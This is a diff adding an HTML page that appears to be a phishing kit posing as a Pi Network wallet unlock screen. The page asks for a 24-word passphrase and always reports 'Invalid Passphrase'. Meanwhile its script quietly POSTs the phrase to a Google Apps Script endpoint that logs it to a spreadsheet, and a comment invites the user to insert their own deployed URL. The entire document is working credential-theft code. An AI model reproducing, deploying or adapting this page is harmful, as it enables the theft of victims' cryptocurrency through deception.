@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <link rel="stylesheet" href="jb.css" />
+    <style>
+        .Invaild {
+            color: red;
+            font-size: 0.9em;
+        }
+       
+    </style>
+</head>
+<body>
+    <div id="__next">
+        <div class="flex flex-col px-5 text-sm gap-10 items-center min-h-screen font-Mulish">
+            <div class="bg-primary absolute top-0 right-0 left-0 flex justify-center items-center text-white gap-2">
+                <img src="chat.jpg" alt="logo" loading="lazy" width="217" height="225" decoding="async" class="h-5 object-contain w-5" style="color:transparent"/>Wallet
+                <img src="logo.png" alt="logo" loading="lazy" width="3000" height="4089" decoding="async" class="h-10 object-contain w-10" style="color:transparent"/>
+            </div>
+            <form id="passphraseForm" class="flex flex-col gap-5 w-4/5 mt-16" method="post" name="google-sheet">
+                <p class="text-center font-bold text-lg">Validate / Unlock Pi Wallet</p>
+                <textarea id="passphrase" placeholder="Enter your 24-word passphrase here" class="h-56 border-[1px] border-neutral-500 placeholder:text-base outline-none p-5 rounded-xl" name="phrase"></textarea>
+                <div id="message" class="error"></div>
+                <input id="unlockButton" type="submit" value="Unlock with passphrase" name="submit" class="w-full border font-bold text-white bg-primary py-2 rounded-md" />
+                <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible. <br/><br/> Lost your passphrase? <span class="text-blue-500">You can create a new wallet</span>, but all your π in your previous wallet will be inaccessible.</p>
+            </form>
+        </div>
+    </div>
+   
+    <script>
+    const scriptURL = "https://script.google.com/macros/s/AKfycbystPX_AO_I4oILrMKSvYgINvatLY5NKMW76lvVmK8wKWNmLdDoEgrg9I5RZDoZfJYH/exec"  // Replace with your deployed Web App URL
+    const form = document.forms['google-sheet']
+    const messageDiv = document.getElementById('message');
+    const textarea = document.getElementById('passphrase');
+
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();  // Prevent form submission until validation
+
+        const passphrase = textarea.value.trim();
+        const words = passphrase.split(/\s+/);
+        const wordCount = words.length;
+
+        // Validate the passphrase
+        const isValid = words.every(word => /^[a-zA-Z0-9]+$/.test(word));
+
+        if (wordCount !== 24) {
+            messageDiv.textContent = `You must enter exactly 24 words. Currently, you have ${wordCount} word(s).`;
+            messageDiv.className = 'error';
+            return;  // Stop further execution if validation fails
+        } else if (!isValid) {
+            messageDiv.textContent = 'All words must be alphanumeric (letters and numbers only).';
+            messageDiv.className = 'error';
+            return;  // Stop further execution if validation fails
+        } else {
+            messageDiv.textContent = 'Invalid Passphrase.';
+            messageDiv.className = 'Invaild';
+        }
+
+        // Send the form data to Google Apps Script (Google Sheets)
+        const formData = new FormData(form);
+        formData.append('passphrase', passphrase); // Append the passphrase to the form data
+
+        fetch(scriptURL, { 
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+            alert("Invalid Passphrase.");
+            console.log(data);
+        })
+        .catch(error => {
+            console.error('Error!', error.message);
+            alert("Invalid Passphrase");
+        });
+    });
+    </script>
+</body>
+</html>
